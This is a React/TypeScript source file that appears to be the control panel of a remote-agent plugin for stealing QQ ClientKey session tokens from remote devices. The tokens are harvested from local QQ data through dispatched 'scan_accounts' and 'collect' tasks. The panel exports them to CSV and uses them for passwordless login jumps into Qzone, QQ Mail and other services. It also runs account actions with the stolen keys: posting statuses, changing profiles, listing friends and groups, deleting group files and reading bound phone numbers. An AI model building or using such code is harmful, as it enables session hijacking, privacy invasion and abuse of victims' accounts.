import { useCallback, useEffect, useMemo, useRef, useState, type ReactNode } from 'react';
import {
  Accordion, Avatar, Button, Card, Chip, ComboBox, Description, Input, Label, ListBox,
  Modal, Spinner, Surface, Table, Tabs, TextArea, TextField,
} from '@heroui/react';
import { usePluginHost } from '../../hooks/usePluginHost';
import { qqBiz, type QQBizParams } from '../../api/qqbiz';

interface QQAccount {
  uin: string;
  nickname?: string;
  clientkey?: string;
  ptsigx?: string;
}

interface QQKeyResult {
  accounts?: QQAccount[];
  error?: string;
}

interface BizResult {
  ok: boolean;
  data?: unknown;
  error?: string;
}

type TabKey = 'list' | 'biz';
type ResultKind = 'friends' | 'groups' | 'files' | 'notices' | 'text';

/** 插件结果可能是 JSON 字符串（服务端透传）或已是对象，统一解析。 */
function parseResult(raw: unknown): QQKeyResult | null {
  if (raw && typeof raw === 'object' && !Array.isArray(raw)) return raw as QQKeyResult;
  if (typeof raw === 'string') {
    try {
      const p: unknown = JSON.parse(raw);
      if (p && typeof p === 'object' && !Array.isArray(p)) return p as QQKeyResult;
    } catch { /* 非 JSON */ }
  }
  return null;
}

/** QQ 头像（qlogo 支持 https，避免 https 页面出现 mixed-content 拦截）。 */
function avatarUrl(uin: string): string {
  return `https://q2.qlogo.cn/headimg_dl?dst_uin=${uin}&spec=100`;
}

async function copyText(text: string) {
  try {
    await navigator.clipboard.writeText(text);
  } catch {
    const ta = document.createElement('textarea');
    ta.value = text;
    document.body.appendChild(ta);
    ta.select();
    document.execCommand('copy');
    ta.remove();
  }
}

/** 按 uin 合并账号（探测到的账号 + 抓取的 clientkey/ptsigx）。 */
function mergeAccounts(scan: QQAccount[], ck: QQAccount[]): QQAccount[] {
  const map = new Map<string, QQAccount>();
  for (const a of ck) map.set(a.uin, { ...a });
  for (const a of scan) {
    const prev = map.get(a.uin) ?? { uin: a.uin };
    map.set(a.uin, { ...prev, ...a });
  }
  return Array.from(map.values()).sort((a, b) => a.uin.localeCompare(b.uin));
}

// ── QQ 业务结果解析 ───────────────────────────────────────────────────

/** 剥掉 JSONP 外壳（_Callback(...) / xxx(...)）。 */
function stripJsonp(raw: string): string {
  const t = raw.trim();
  const m = t.match(/^[\w$]+\s*\((.*)\)\s*;?\s*$/s);
  return m ? (m[1] ?? t) : t;
}

function tryParse(raw: string): unknown | null {
  try { return JSON.parse(stripJsonp(raw)); } catch { return null; }
}

/** 从任意嵌套响应里取第一个"像列表"的数组（items_list/gnamelist/file_list/feeds…）。 */
function firstList(obj: unknown): unknown[] | null {
  if (Array.isArray(obj)) return obj;
  if (obj && typeof obj === 'object') {
    const direct = (obj as Record<string, unknown>);
    for (const k of ['items_list', 'gnamelist', 'file_list', 'feeds']) {
      if (Array.isArray(direct[k])) return direct[k] as unknown[];
    }
    for (const key of ['data', 'returnData']) {
      const nested = direct[key];
      if (nested && typeof nested === 'object') {
        for (const v of Object.values(nested as Record<string, unknown>))
          if (Array.isArray(v)) return v as unknown[];
      }
    }
  }
  return null;
}

function fmtBytes(n: unknown): string {
  const b = Number(n) || 0;
  if (b >= 1024 * 1024) return (b / 1024 / 1024).toFixed(1) + ' MB';
  if (b >= 1024) return (b / 1024).toFixed(1) + ' KB';
  return b + ' B';
}

/** 探测本机 QQ / 抓取 ClientKey / QQ 业务。 */
export default function QQKeyPage() {
  const { selectedAgent, dispatchTask } = usePluginHost();
  const [tab, setTab] = useState<TabKey>('list');
  const [scanRunning, setScanRunning] = useState(false);
  const [ckRunning, setCkRunning] = useState(false);
  const [rows, setRows] = useState<QQAccount[]>([]);
  const [err, setErr] = useState<string | null>(null);
  const autoRef = useRef<string | null>(null);

  /** 探测本机 QQ 列表（不自动抓 clientkey，保留已抓到的 CK）。 */
  const rescanAccounts = useCallback(async () => {
    if (!selectedAgent) return;
    setScanRunning(true);
    setErr(null);
    try {
      const s = await dispatchTask('com.libra.qqkey', 'scan_accounts', {});
      const scan = parseResult(s.result)?.accounts ?? [];
      setRows((prev) => mergeAccounts(scan, prev)); // prev 作为 ck 源，保留已有 CK
    } catch (e) {
      setErr(e instanceof Error ? e.message : '探测失败');
    } finally {
      setScanRunning(false);
    }
  }, [selectedAgent, dispatchTask]);

  /** 手动抓取 ClientKey（用户点击「获取 CK」后执行）。 */
  const fetchClientKeys = useCallback(async () => {
    if (!selectedAgent) return;
    setCkRunning(true);
    setErr(null);
    try {
      const c = await dispatchTask('com.libra.qqkey', 'collect', {});
      const ck = parseResult(c.result)?.accounts ?? [];
      setRows((prev) => mergeAccounts(prev, ck)); // ck 优先合并回填
      if (ck.length === 0) setErr('未抓到 ClientKey，请确认 Agent 上的 QQ 已登录');
    } catch (e) {
      setErr(e instanceof Error ? e.message : '抓取失败');
    } finally {
      setCkRunning(false);
    }
  }, [selectedAgent, dispatchTask]);

  // 选中 Agent 自动探测列表；ClientKey 需手动点「获取 CK」
  useEffect(() => {
    if (!selectedAgent) return;
    if (autoRef.current === selectedAgent.id) return;
    autoRef.current = selectedAgent.id;
    rescanAccounts();
  }, [selectedAgent, rescanAccounts]);

  const copyRow = async (a: QQAccount) => {
    await copyText(`${a.uin} ${a.clientkey ?? ''}`.trim());
  };

  return (
    <div className="space-y-4">
      <Card className="p-6">
        <div className="flex flex-wrap items-center gap-3">
          <h1 className="text-xl font-semibold">QQ 业务</h1>

          <Tabs selectedKey={tab} onSelectionChange={(k) => setTab(String(k) as TabKey)}>
            <Tabs.ListContainer>
              <Tabs.List aria-label="qq tabs">
                <Tabs.Tab id="list" className="w-[160px]">QQ 列表<Tabs.Indicator /></Tabs.Tab>
                <Tabs.Tab id="biz" className="w-[160px]">QQ 业务<Tabs.Indicator /></Tabs.Tab>
              </Tabs.List>
            </Tabs.ListContainer>
          </Tabs>

          <div className="flex-1" />

          <Button variant="primary" isPending={ckRunning} isDisabled={!selectedAgent} onPress={fetchClientKeys}>
            获取 CK
          </Button>
          <Button variant="ghost" isPending={scanRunning} isDisabled={!selectedAgent} onPress={rescanAccounts}>
            重新扫描
          </Button>
          {!selectedAgent && <Chip size="sm" color="warning">请先在顶部选择设备</Chip>}
        </div>
      </Card>

      {err && <Card className="p-4 border border-danger"><p className="text-danger text-sm">{err}</p></Card>}

      {tab === 'list' && <ListPanel rows={rows} onCopy={copyRow} />}
      {tab === 'biz' && <BizPanel rows={rows} />}
    </div>
  );
}

// ── 列表：搜索 + 导出 CSV + 头像（size-6）/ QQNumber / 昵称 / ClientKey / 操作 ──
function ListPanel({ rows, onCopy }: {
  rows: QQAccount[]; onCopy: (a: QQAccount) => void;
}) {
  const [keyword, setKeyword] = useState('');
  const openQzone = (ptsigx: string) => {
    if (ptsigx) window.open(ptsigx, '_blank', 'noopener,noreferrer');
  };

  const filtered = useMemo(() => {
    const kw = keyword.trim().toLowerCase();
    if (!kw) return rows;
    return rows.filter((r) =>
      r.uin.includes(kw) || (r.nickname ?? '').toLowerCase().includes(kw)
    );
  }, [rows, keyword]);

  const exportCsv = () => {
    const header = ['QQ号', '昵称', 'ClientKey'];
    const lines = filtered.map((r) => [r.uin, r.nickname ?? '', r.clientkey ?? '']);
    const csv = [header, ...lines]
      .map((l) => l.map((c) => `"${String(c).replace(/"/g, '""')}"`).join(','))
      .join('\n');
    const blob = new Blob(['\ufeff' + csv], { type: 'text/csv;charset=utf-8' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = 'qq_accounts.csv';
    a.click();
    URL.revokeObjectURL(url);
  };

  const ckCount = rows.filter((r) => r.clientkey).length;

  return (
    <Card className="p-4">
      <div className="flex flex-wrap items-center gap-2 mb-3">
        <h2 className="font-semibold">QQ 列表</h2>
        <Chip size="sm" variant="secondary">{rows.length} 个账号</Chip>
        <Chip size="sm" variant="soft" color={ckCount > 0 ? 'success' : 'warning'}>CK {ckCount} 个</Chip>
        <div className="flex-1" />
        <TextField variant="secondary" value={keyword} onChange={setKeyword} className="w-56">
          <Input placeholder="搜索 QQ 号 / 昵称" />
        </TextField>
        <Button size="sm" variant="ghost" isDisabled={filtered.length === 0} onPress={exportCsv}>
          导出 CSV
        </Button>
      </div>

      {rows.length === 0 ? (
        <p className="text-sm text-default-500">未发现本机 QQ 数据（Documents\Tencent Files）。点击「重新扫描」。</p>
      ) : (
        <Table>
          <Table.ScrollContainer>
            <Table.Content aria-label="qq table" className="min-w-[640px]">
              <Table.Header>
                <Table.Column isRowHeader>LOGO</Table.Column>
                <Table.Column>QQNumber</Table.Column>
                <Table.Column>昵称</Table.Column>
                <Table.Column>ClientKey</Table.Column>
                <Table.Column>操作</Table.Column>
              </Table.Header>
              <Table.Body>
                {filtered.map((a, i) => (
                  <Table.Row key={a.uin || i} id={`row-${a.uin || i}`}>
                    <Table.Cell>
                      <img
                        src={avatarUrl(a.uin)}
                        alt={a.uin}
                        className="size-6 shrink-0 rounded-full object-cover bg-default-100"
                        onError={(e) => { (e.target as HTMLImageElement).style.visibility = 'hidden'; }}
                      />
                    </Table.Cell>
                    <Table.Cell className="font-mono text-sm">{a.uin}</Table.Cell>
                    <Table.Cell className="text-sm">{a.nickname || '-'}</Table.Cell>
                    <Table.Cell className="font-mono text-xs max-w-[300px] break-all">
                      {a.clientkey ? a.clientkey : <span className="text-default-400">-</span>}
                    </Table.Cell>
                    <Table.Cell>
                      <div className="flex items-center gap-2">
                        <Button size="sm" variant="ghost" isDisabled={!a.clientkey} onPress={() => onCopy(a)}>COPY</Button>
                        <Button size="sm" variant="ghost" isDisabled={!a.ptsigx} onPress={() => a.ptsigx && openQzone(a.ptsigx)}>QQ 空间</Button>
                      </div>
                    </Table.Cell>
                  </Table.Row>
                ))}
              </Table.Body>
            </Table.Content>
          </Table.ScrollContainer>
        </Table>
      )}

      {ckCount === 0 && rows.length > 0 && (
        <p className="text-xs text-default-400 mt-2">尚未获取 ClientKey —— 点击顶部「获取 CK」按钮抓取。</p>
      )}
    </Card>
  );
}

// ────────────────────────── QQ 业务（服务端脚本驱动） ──────────────────────────

const BIZ_JUMP: Record<string, string> = {
  'QQ 空间': 'https://user.qzone.qq.com/{uin}/infocenter',
  'QQ 邮箱': 'https://wx.mail.qq.com/list/readtemplate?name=login_page.html',
  '群空间': 'https://qun.qq.com',
  '亲密空间': 'https://ti.qq.com',
  '账户中心': 'https://accounts.qq.com',
  'H5 空间': 'https://h5.qzone.qq.com',
  'ZBVIP': 'https://zb.vip.qq.com/kuikly/category/4350',
};

function jumpUrl(uin: string, key: string, u1: string): string {
  return `https://ssl.ptlogin2.qq.com/jump?ptlang=1033&clientuin=${uin}&clientkey=${key}&u1=${encodeURIComponent(u1)}&source=panelstar&keyindex=19`;
}

function BizPanel({ rows }: { rows: QQAccount[] }) {
  const [uin, setUin] = useState('');
  const [key, setKey] = useState('');
  const [err, setErr] = useState<string | null>(null);
  const [busy, setBusy] = useState(false);
  const [ssText, setSsText] = useState('');
  const [nick, setNick] = useState('');
  const [company, setCompany] = useState('');
  const [qunn, setQunn] = useState('');
  const [targetUin, setTargetUin] = useState('');
  const [busId, setBusId] = useState('');
  const [fileId, setFileId] = useState('');
  const [favorite, setFavorite] = useState('');
  // 结果模态框
  const [modal, setModal] = useState<{ title: string; kind: ResultKind; data: unknown; raw: string } | null>(null);

  const withKey = rows.find((r) => r.uin === uin)?.clientkey ?? '';
  const bizUin = uin || rows[0]?.uin || '';
  const bizKey = key || withKey || rows.find((r) => r.uin === bizUin)?.clientkey || '';

  const runBiz = async (action: string, kind: ResultKind, title: string, params: Partial<QQBizParams> = {}) => {
    if (!bizUin || !bizKey) { setErr('请先选择账号（需要 clientkey）'); return; }
    setErr(null);
    setBusy(true);
    try {
      const res = await qqBiz(action, { uin: bizUin, clientkey: bizKey, ...params }) as BizResult;
      if (!res.ok) {
        setModal({ title, kind: 'text', data: null, raw: `执行失败：${res.error ?? 'unknown'}` });
        return;
      }
      const raw = typeof res.data === 'string' ? res.data : JSON.stringify(res.data ?? '(empty)');
      const parsed = tryParse(raw);
      setModal({ title, kind: parsed === null ? 'text' : kind, data: parsed, raw });
    } catch (e) {
      setModal({ title, kind: 'text', data: null, raw: `请求失败：${e instanceof Error ? e.message : String(e)}` });
    } finally {
      setBusy(false);
    }
  };

  const accounts = useMemo(
    () => rows.filter((r) => r.clientkey).map((r) => ({ uin: r.uin, key: r.clientkey! })),
    [rows],
  );

  return (
    <div className="space-y-4">
      {err && <Card className="p-4 border border-danger"><p className="text-danger text-sm">{err}</p></Card>}

      {/* 账号选择 */}
      <Card className="p-4">
        <h3 className="font-semibold mb-2">选择 QQ 账号（uin + clientkey，用于身份）</h3>
        <div className="flex flex-wrap items-end gap-3">
          <ComboBox
            className="w-[256px]"
            selectedKey={uin || null}
            onSelectionChange={(k) => { setUin(String(k ?? '')); setKey(''); }}
          >
            <Label>选择账号</Label>
            <ComboBox.InputGroup>
              <Input placeholder="搜索/选择 QQ 账号…" />
              <ComboBox.Trigger />
            </ComboBox.InputGroup>
            <ComboBox.Popover>
              <ListBox aria-label="accounts">
                {accounts.map((a) => (
                  <ListBox.Item key={a.uin} id={a.uin} textValue={a.uin}>
                    <span className="font-mono">{a.uin}</span>
                    <ListBox.ItemIndicator />
                  </ListBox.Item>
                ))}
              </ListBox>
            </ComboBox.Popover>
          </ComboBox>
          <TextField variant="secondary" className="w-64">
            <Label className="sr-only">clientkey</Label>
            <Input value={key || bizKey} onChange={(e) => setKey((e.target as HTMLInputElement).value)} placeholder="clientkey（留空自动取该账号）" />
          </TextField>
          {busy && <Spinner size="sm" />}
        </div>
        <p className="text-xs text-default-400 mt-2">
          {bizUin && bizKey ? `当前：${bizUin} / ${bizKey.slice(0, 8)}…` : '请先「重新扫描」并在列表中选取账号。'}
          业务由插件 service/main.cs 服务端执行，结果以模态框展示。
        </p>
      </Card>

      {/* 免登跳转 */}
      <Card className="p-4">
        <h3 className="font-semibold mb-2">免登跳转（新窗口打开）</h3>
        <div className="flex flex-wrap gap-2">
          {Object.entries(BIZ_JUMP).map(([name, u1]) => (
            <Button key={name} size="sm" variant="outline"
              isDisabled={!bizUin || !bizKey}
              onPress={() => window.open(jumpUrl(bizUin, bizKey, u1.replace('{uin}', bizUin)), '_blank', 'noopener,noreferrer')}>
              {name}
            </Button>
          ))}
        </div>
      </Card>

      {/* 业务工具 */}
      <Accordion className="w-full">
        <Tool
          title="发 QQ 空间说说" desc="发布一条动态到该账号空间"
          fields={(
            <TextArea value={ssText} onChange={(e) => setSsText((e.target as HTMLTextAreaElement).value)} placeholder="说说内容" rows={2} />
          )}
          run={() => runBiz('shuoshuo', 'text', '发布说说', { text: ssText })}
        />
        <Tool
          title="修改 QQ 空间资料" desc="改昵称 / 公司"
          fields={(
            <div className="flex flex-wrap gap-2">
              <Input value={nick} onChange={(e) => setNick((e.target as HTMLInputElement).value)} placeholder="昵称" className="w-48" />
              <Input value={company} onChange={(e) => setCompany((e.target as HTMLInputElement).value)} placeholder="公司/签名" className="w-48" />
            </div>
          )}
          run={() => runBiz('profile', 'text', '修改资料', { nickname: nick, company })}
        />
        <Tool
          title="好友列表" desc="获取该账号 QQ 空间好友列表"
          fields={null}
          run={() => runBiz('friends', 'friends', '好友列表')}
        />
        <Tool
          title="群组列表" desc="获取该账号加入的 QQ 群列表"
          fields={null}
          run={() => runBiz('groups', 'groups', '群组列表')}
        />
        <Tool
          title="群公告列表" desc="获取指定群公告"
          fields={(
            <Input value={qunn} onChange={(e) => setQunn((e.target as HTMLInputElement).value)} placeholder="群号" className="w-48" />
          )}
          run={() => runBiz('group_notice', 'notices', `群公告 ${qunn}`, { qunn })}
        />
        <Tool
          title="群文件列表" desc="获取指定群文件"
          fields={(
            <Input value={qunn} onChange={(e) => setQunn((e.target as HTMLInputElement).value)} placeholder="群号" className="w-48" />
          )}
          run={() => runBiz('group_files', 'files', `群文件 ${qunn}`, { qunn })}
        />
        <Tool
          title="删除群文件" desc="bus_id + file_id"
          fields={(
            <div className="flex flex-wrap gap-2">
              <Input value={qunn} onChange={(e) => setQunn((e.target as HTMLInputElement).value)} placeholder="群号" className="w-40" />
              <Input value={busId} onChange={(e) => setBusId((e.target as HTMLInputElement).value)} placeholder="bus_id" className="w-40" />
              <Input value={fileId} onChange={(e) => setFileId((e.target as HTMLInputElement).value)} placeholder="file_id" className="w-40" />
            </div>
          )}
          run={() => runBiz('delete_file', 'text', '删除群文件', { qunn, busId, fileId })}
        />
        <Tool
          title="查看好友亲密度" desc="target_uin"
          fields={(
            <Input value={targetUin} onChange={(e) => setTargetUin((e.target as HTMLInputElement).value)} placeholder="目标 uin" className="w-48" />
          )}
          run={() => runBiz('friendship', 'text', `亲密度 ${targetUin}`, { targetUin })}
        />
        <Tool
          title="设置/移除特别关心" desc="special: 1 设置 / 0 移除"
          fields={(
            <div className="flex flex-wrap gap-2">
              <Input value={targetUin} onChange={(e) => setTargetUin((e.target as HTMLInputElement).value)} placeholder="目标 uin" className="w-48" />
              <Input value={favorite} onChange={(e) => setFavorite((e.target as HTMLInputElement).value)} placeholder="action 0/1" className="w-20" />
            </div>
          )}
          run={() => runBiz('care', 'text', '特别关心', { targetUin, careAction: Number(favorite || 1) })}
        />
        <Tool
          title="获取绑定手机号" desc="读取账号绑定的手机号"
          fields={null}
          run={() => runBiz('phone', 'text', '绑定手机号')}
        />
      </Accordion>

      {/* 结果模态框 */}
      <ResultModal
        modal={modal}
        onClose={() => setModal(null)}
        onAction={runBiz}
      />
    </div>
  );
}

// ── 结果模态框：按类型渲染 ────────────────────────────────────────────

function ResultModal({ modal, onClose, onAction }: {
  modal: { title: string; kind: ResultKind; data: unknown; raw: string } | null;
  onClose: () => void;
  onAction: (action: string, kind: ResultKind, title: string, params?: Partial<QQBizParams>) => void;
}) {
  return (
    <Modal.Backdrop isOpen={modal !== null} onOpenChange={(open) => { if (!open) onClose(); }}>
      <Modal.Container size="lg">
        <Modal.Dialog>
          <Modal.CloseTrigger />
          <Modal.Header>
            <Modal.Heading>{modal?.title ?? ''}</Modal.Heading>
          </Modal.Header>
          <Modal.Body>
            {modal && renderResult(modal.kind, modal.data, modal.raw, onAction)}
          </Modal.Body>
        </Modal.Dialog>
      </Modal.Container>
    </Modal.Backdrop>
  );
}

function renderResult(kind: ResultKind, data: unknown, raw: string, onAction: (a: string, k: ResultKind, t: string, p?: Partial<QQBizParams>) => void): ReactNode {
  if (data === null) {
    return <pre className="font-mono text-xs whitespace-pre-wrap break-all bg-default-50 dark:bg-default-900 p-3 rounded max-h-[60vh] overflow-auto">{raw}</pre>;
  }

  const list = firstList(data);

  if (kind === 'friends' && list) {
    return (
      <Surface className="rounded-2xl">
        <ListBox aria-label="friends">
          {list.map((it, i) => {
            const o = it as Record<string, unknown>;
            const uin = String(o.uin ?? '');
            const name = String(o.name ?? uin);
            const img = typeof o.img === 'string' ? o.img : avatarUrl(uin);
            return (
              <ListBox.Item key={uin || i} id={uin || String(i)} textValue={name}>
                <Avatar size="sm">
                  <Avatar.Image alt={name} src={img} />
                  <Avatar.Fallback>{name[0] ?? '?'}</Avatar.Fallback>
                </Avatar>
                <div className="flex flex-col">
                  <Label>{name}</Label>
                  <Description>{uin}{o.score !== undefined ? ` · 亲密度 ${o.score}` : ''}</Description>
                </div>
                <ListBox.ItemIndicator />
              </ListBox.Item>
            );
          })}
        </ListBox>
      </Surface>
    );
  }

  if (kind === 'groups' && list) {
    return (
      <Surface className="rounded-2xl">
        <ListBox aria-label="groups">
          {list.map((it, i) => {
            const o = it as Record<string, unknown>;
            const gc = String(o.gc ?? o.gcode ?? o.qid ?? '');
            const gname = String(o.gname ?? o.name ?? gc);
            return (
              <ListBox.Item key={gc || i} id={gc || String(i)} textValue={gname}>
                <Avatar size="sm">
                  <Avatar.Image alt={gname} src={`https://p.qlogo.cn/gh/${gc}/${gc}/100`} />
                  <Avatar.Fallback>{gname[0] ?? '群'}</Avatar.Fallback>
                </Avatar>
                <div className="flex flex-col">
                  <Label>{gname}</Label>
                  <Description>{gc || '未知群号'}</Description>
                </div>
                <ListBox.ItemIndicator />
              </ListBox.Item>
            );
          })}
        </ListBox>
      </Surface>
    );
  }

  if (kind === 'files' && list) {
    return (
      <div className="space-y-2 max-h-[60vh] overflow-auto">
        {list.map((it, i) => {
          const o = it as Record<string, unknown>;
          return (
            <div key={i} className="flex items-center gap-3 rounded-lg border border-default-100 p-3">
              <div className="min-w-0 flex-1">
                <div className="font-medium text-sm truncate">{String(o.file_name ?? o.name ?? '-')}</div>
                <div className="text-xs text-default-500 mt-0.5">
                  {fmtBytes(o.file_size ?? o.size)}
                  {o.uploader_name ? ` · ${o.uploader_name}` : ''}
                  {o.bus_id !== undefined ? ` · bus=${o.bus_id}` : ''}
                </div>
              </div>
              {o.btn_text ? <Chip size="sm" variant="soft" color="warning">{String(o.btn_text)}</Chip> : null}
            </div>
          );
        })}
      </div>
    );
  }

  if (kind === 'notices' && list) {
    return (
      <div className="space-y-2 max-h-[60vh] overflow-auto">
        {list.map((it, i) => {
          const o = it as Record<string, unknown>;
          const title = String(o.title ?? o.text_info ?? '公告');
          return (
            <Card key={i} className="p-3">
              <div className="font-medium text-sm">{title}</div>
              {o.text_info !== undefined && String(o.text_info) !== title && (
                <p className="text-xs text-default-500 mt-1 whitespace-pre-wrap break-all">{String(o.text_info)}</p>
              )}
              {o.time_str !== undefined && <div className="text-[11px] text-default-400 mt-1">{String(o.time_str)}</div>}
            </Card>
          );
        })}
      </div>
    );
  }

  // 其余（说说/资料/删除/亲密/特别关心/手机号）：格式化 JSON
  const obj = tryParse(raw);
  return (
    <pre className="font-mono text-xs whitespace-pre-wrap break-all bg-default-50 dark:bg-default-900 p-3 rounded max-h-[60vh] overflow-auto">
      {obj !== null ? JSON.stringify(obj, null, 2) : raw}
    </pre>
  );
}

/** 一个可展开的业务工具（Accordion 项）。 */
function Tool({ title, desc, fields, run }: {
  title: string; desc: string; fields: ReactNode | null; run: () => void | Promise<void>;
}) {
  return (
    <Accordion.Item key={title}>
      <Accordion.Heading>
        <Accordion.Trigger>
          <span className="font-semibold">{title}</span>
          <span className="text-xs text-default-500 ml-2">{desc}</span>
          <Accordion.Indicator />
        </Accordion.Trigger>
      </Accordion.Heading>
      <Accordion.Panel>
        <Accordion.Body>
          <div className="space-y-2">
            {fields}
            <Button size="sm" variant="primary" onPress={run}>执行</Button>
          </div>
        </Accordion.Body>
      </Accordion.Panel>
    </Accordion.Item>
  );
}